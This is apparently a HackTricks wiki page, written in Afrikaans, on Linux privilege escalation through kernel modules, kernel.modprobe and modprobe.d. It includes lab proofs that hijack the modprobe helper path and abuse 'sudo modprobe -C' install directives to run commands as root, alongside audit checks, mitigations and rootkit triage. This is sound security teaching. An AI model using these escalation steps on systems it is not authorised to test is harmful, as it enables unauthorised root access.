# Kernelmodules en misbruik van modprobe

{{#include ../../banners/hacktricks-training.md}}

## Kernmodule- en modulelaai-wanopstellings

Ondersteuning vir kernmodules is ’n hoë-impakgebied tydens ’n Linux privilege escalation-oorsig. Moenie elke boodskap oor ’n ongetekende module op sigself as uitbuitbaar beskou nie, maar gebruik dit om praktiese vrae te beantwoord.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- Kan die huidige gebruiker modules deur `sudo`, capabilities of ’n skryfbare helper-pad laai?
- Is die laai van modules steeds geaktiveer?
- Is afdwinging van modulesignature gedeaktiveer?
- Is modulegidse, modulelêers of `modprobe.d`-konfigurasiepaaie skryfbaar?<sup>[[16]](#references)</sup>
- Kan kernlogboeke gelees word om te bevestig wat gebeur het?

Vinnige triage begin met die volgende kontroles vir modulestatus, signatures, logging en die moduleboom.<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>

```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```

Interpretasie:

- `modules_disabled=1` beteken modules kan nóg gelaai nóg ontlaai word, en die waarde kan nie na `0` teruggestel word voordat daar herlaai is nie.<sup>[[1]](#references)</sup>
- `module.sig_enforce=1` op die kernel-opdragreël of `CONFIG_MODULE_SIG_FORCE=y` vereis geldig ondertekende modules; andersins kan ongetekende modules laai en die kernel taint.<sup>[[2]](#references)</sup>
- `dmesg_restrict=0` plaas geen beperking op `dmesg` nie; wanneer dit `1` is, vereis toegang `CAP_SYSLOG`.<sup>[[1]](#references)</sup>
- Skryfbare paaie onder `/lib/modules/$(uname -r)/` is gevaarlik omdat `modprobe` daardie boom en sy afhanklikheidsdata deursoek wanneer modules gelaai word.<sup>[[8]](#references)</sup>

### Laai van 'n module en lees van kernuitvoer

As jy die nodige toestemming het om 'n plaaslike module te laai, voeg `insmod` die presiese `.ko`-lêer in wat jy verskaf. Die module se init-funksie loop as deel van die laaiproses, en boodskappe wat met `printk()` geskryf word, gaan na die kernlogbuffer, wat gewoonlik met `dmesg` gelees word.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

'n Minimale hersieningswerkvloei gebruik `modinfo` om metadata te ondersoek, `insmod` en `rmmod` om 'n module te laai en te verwyder, `lsmod` om te bevestig dat dit gelaai is, en `dmesg` om kernlogs te ondersoek.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```

As `sudo -l` `insmod`, `modprobe` of 'n omhulsel rondom hulle toelaat, behandel dit as kritiek: `sudo -l` lys die aanroepende gebruiker se voorregte, en om 'n kernelmodule te laai vereis `CAP_SYS_MODULE`. Sien [Linux capabilities](../interesting-files-permissions/linux-capabilities.md#cap_sys_module) vir direkte paaie wat op vermoëns gebaseer is.<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>

```bash
sudo -l
sudo /sbin/insmod ./example.ko
```

### `insmod` toegelaat deur sudo

’n sudo-reël wat ’n gebruiker toelaat om `insmod` uit te voer, is nie vergelykbaar met toestemming om ’n gewone administratiewe hulpprogram te gebruik nie. Die module se initialiseringskode loop as deel van die invoeging, dus is die praktiese hersieningsvraag of hierdie gebruiker die module wat gelaai word, kan kies of wysig.<sup>[[3]](#references)</sup>

Die volgende algemene hersieningsvloei herhaal daardie kontroles vir inspeksie, laai, toestand, logs en verwydering vir ’n kandidaatmodule.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```

As die gebruiker 'n arbitrêre `.ko` kan verskaf, moet die reël in 'n geautoriseerde assessering as 'n volledige stelselkompromittering beskou word. 'n Veiliger bedryfspatroon is om nie modulelaai via sudo te delegeer nie; as dit onvermydelik is, beperk die presiese pad, eienaarskap, toestemmings, ondertekeningsbeleid en verwyderingswerkvloei.<sup>[[3]](#references)[[10]](#references)</sup>

Vir 'n onskadelike patroon om modules in 'n beheerde laboratorium te bou, word 'n minimale bronlêer en Makefile hieronder getoon; die `make -C /lib/modules/$(uname -r)/build M=$PWD`-vorm volg die kern se gedokumenteerde kbuild-werkvloei vir eksterne modules.<sup>[[5]](#references)[[7]](#references)</sup>

```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
    printk(KERN_INFO "demo module loaded\n");
    return 0;
}

static void __exit demo_exit(void) {
    printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

Bou en laai slegs in ’n gemagtigde laboratorium; kbuild bou die eksterne module, en die laai-/verwyder-opdragte roep die kernmodule-koppelvlakke aan.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>

```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```

### `kernel.modprobe` / `modprobe_path`-misbruiktoetse

`kernel.modprobe` benoem die userspace-helper wat die kernel uitvoer vir module-outolaai-versoeke; hierdie sysctl beïnvloed outolaai, nie eksplisiete module-invoeging nie. As ’n aanvaller dit na ’n skryfbare uitvoerbare pad kan verander en ’n moduleversoek kan aktiveer, word daardie helper ’n bevoorregte kode-uitvoeringspad. Deur dit op die leë string te stel, word outolaai-versoeke gedeaktiveer; as `CONFIG_STATIC_USERMODEHELPER=y`, word ’n nie-leë waarde oorskryf deur die statiese helperpad wat tydens samestelling ingebou is.<sup>[[1]](#references)</sup>

Gaan die huidige helperpad na via die kernel se sysctl-koppelvlak en ondersoek die teiken se eienaarskap en modus.<sup>[[1]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```

Gaan na of sysctl, gedelegeerde sudo-reëls of file capabilities beïnvloed kan word.<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>

```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```

Die volgende patroon, wat slegs vir ’n laboratorium bedoel is, verander die helper-pad en veroorsaak ’n gedokumenteerde module-autoload-versoek; gebruik dit slegs op ’n geïsoleerde, gemagtigde stelsel.<sup>[[1]](#references)</sup>

Moenie op huidige Linux-kernels ’n onbekende uitvoerbare lêer as ’n algemene sneller gebruik nie: verouderde, pasgemaakte module-autoloading vir binêre formate is in Linux 6.14 verwyder, terwyl die kerndokumentasie ’n onbekende lêerstelseltipe as ’n module-autoload-versoekroete identifiseer.<sup>[[1]](#references)[[11]](#references)</sup>

```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```

Op verhardde stelsels behoort dit te misluk wanneer toestemmings ongemagtigde skryfpogings na `kernel.modprobe` verhoed, die helper-pad nie skryfbaar is nie, of outomatiese modulelaai gedeaktiveer is.<sup>[[1]](#references)</sup>

### Skryfbare `modprobe.d`-konfigurasie en `sudo modprobe -C`

Voordat `modprobe` ’n module oplos, lees dit `.conf`-lêers uit konfigurasiegidse soos `/etc/modprobe.d`, `/run/modprobe.d`, `/usr/local/lib/modprobe.d`, `/usr/lib/modprobe.d` en `/lib/modprobe.d`, in prioriteitsvolgorde. ’n Lêer met dieselfde naam in ’n gids met hoër prioriteit oorskadu die lêer met laer prioriteit. Belangriker nog, ’n `install <module> <command>`-instruksie voer ’n arbitrêre shell-opdrag uit **in plaas daarvan om** daardie module in te voeg. ’n Skryfbare konfigurasiepad kan dus lei tot vertraagde opdraguitvoering met die geloofsbriewe van ’n latere bevoorregte `modprobe`-oproeper; handhawing van kernmodule-handtekeninge verifieer nie hierdie userspace-opdrag nie.<sup>[[16]](#references)</sup>

Oudit die toestemmings op gidse en lêers, en inspekteer dan die effektiewe konfigurasie. `modprobe -n -v` is veilig vir die hersiening van module-oplossing, want droëloopmodus voeg nie die module in nie en voer ook nie ’n `install`-/`remove`-opdrag uit nie. Verkies `modprobe -c` bo die verouderde `--showconfig`-spelling, wat huidige kmod-dokumentasie aandui vir verwydering ná kmod 36.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
    [ -e "$d" ] || continue
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
done

grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
  /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
  /usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
modprobe -n -v <module_name>
```

’n Onbeperkte sudo-reël vir `modprobe` is uitbuitbaar selfs wanneer willekeurige `.ko`-lêers nie handtekeningverifikasie kan slaag nie: `-C` kies ’n aanvallerbeheerde konfigurasiegids, waaruit ’n `install`-opdrag deur die sudo-geloodsde proses uitgevoer kan word.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
# Authorized lab proof for an unrestricted `sudo modprobe` rule
D="$(mktemp -d)"
printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
sudo /sbin/modprobe -C "$D" ht_probe
cat /tmp/ht-modprobe-id
```

Vir versagting: moenie `modprobe` sonder argumentbeperkings via sudo toelaat nie, hou elke konfigurasiegids in root se besit en nie-skryfbaar nie, en hersien onverwagte `install`-/`remove`-aanwysings. Wanneer ’n vertroude administratiewe werkvloei sulke aanwysings vir een module moet omseil, ignoreer `modprobe --ignore-install` dit vir daardie benoemde module, maar afhanklikhede kan steeds hul eie opdragte hê.<sup>[[8]](#references)[[16]](#references)</sup>

### Hersiening van skryfbare `/lib/modules`

Skryfbare modulegidse kan modulevervanging, die plant van kwaadwillige modules of misbruik van outomatiese laai moontlik maak, afhangend van hoe `modprobe` later aangeroep word; `modprobe` soek in `/lib/modules/$(uname -r)` en gebruik die afhanklikheidsdata daar wanneer modules opgelos word.<sup>[[8]](#references)</sup>

Hersien skryfbare modulelêers en afhanklikheids-/aliasmetadata onder die aktiewe kernelvrystelling se moduleboom.<sup>[[8]](#references)</sup>

```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```

As jy skryfbare module-inhoud vind, ondersoek hoe `modprobe` afhanklikhede oplos en hoe `modinfo` module-metadata rapporteer.<sup>[[8]](#references)[[12]](#references)</sup>

```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```

Verdedigingsnotas:

- Hou `/lib/modules` in besit van `root:root` en nie-skryfbaar deur gebruikers nie.<sup>[[8]](#references)</sup>
- Stel `kernel.modules_disabled=1` ná selflaai in waar dit operasioneel moontlik is.<sup>[[1]](#references)</sup>
- Dwing module-ondertekening af op stelsels wat laaibare modules vereis.<sup>[[2]](#references)</sup>
- Monitor skryfbewerkings na `/proc/sys/kernel/modprobe`, `/lib/modules` en die `modprobe.d`-konfigurasiegidse, asook onverwagte uitvoering van `insmod`/`modprobe`.<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>



## Triage van module-gebaseerde rootkits

’n Kwaadwillige module kan syscalls, VFS- of `/proc`-aansigte, netwerkpaaie of geloofsbriewekontroles haak om prosesse en lêers te versteek, verkeer te herlei of geheime te onderskep. Dit kan homself ook verwyder uit die modulelys wat deur `lsmod` vertoon word. Persistence kan afkomstig wees van `modprobe.d`-aliase of installasiereëls, `/etc/modules-load.d`, ’n systemd-eenheid, initramfs-inhoud of die vervanging van ’n wettige `.ko`-lêer. ’n Normale `lsmod`-resultaat is nuttige bewys, maar ’n kompromittering op kernvlak kan lyste wat deur die kern verskaf word onbetroubaar maak. Vergelyk gelaaide modules, lêers op skyf, selflaaikonfigurasie, modulelaailogboeke en betroubare eksterne telemetrie.

```bash
cat /proc/modules
lsmod
find /lib/modules/"$(uname -r)" -type f -name '*.ko*' -ls 2>/dev/null
grep -R -nE '^(install|softdep|blacklist|options) ' /etc/modprobe.d /run/modprobe.d /usr/lib/modprobe.d 2>/dev/null
find /etc/modules-load.d /usr/lib/modules-load.d -maxdepth 1 -type f -print 2>/dev/null
journalctl -k -b | grep -Ei 'module|taint|signature|lockdown'
cat /proc/sys/kernel/tainted
```

Ondersoek onverwagte module-name, -paaie, -afhanklikhede, -handtekeninge en laaitye. Kernel-taint- en boodskappe oor ongetekende modules is leidrade, nie bewys nie. As ’n rootkit vermoed word, versamel bewyse vanaf ’n vertroude image of herstelomgewing voordat jy op lewendige kernel-uitvoer staatmaak. Die [kernel vulnerability assessment](kernel-vulnerability-assessment.md)-bladsy dek konfigurasie en diagnostiese blootstelling, insluitend tracefs en vasgepinde BPF-objekte.

## References

- [1] [Dokumentasie vir /proc/sys/kernel/ — Die Linux Kernel-dokumentasie](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Kernel-module-ondertekeningsfasiliteit — Die Linux Kernel-dokumentasie](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Drywerbeginsels — Die Linux Kernel-dokumentasie](https://docs.kernel.org/driver-api/basics.html)
- [6] [Boodskapregistrasie met printk — Die Linux Kernel-dokumentasie](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [Bou van eksterne modules — Die Linux Kernel-dokumentasie](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [Voeg merker 'execve-v6.14-rc1' saam — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [16] [modprobe.d(5) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
{{#include ../../banners/hacktricks-training.md}}
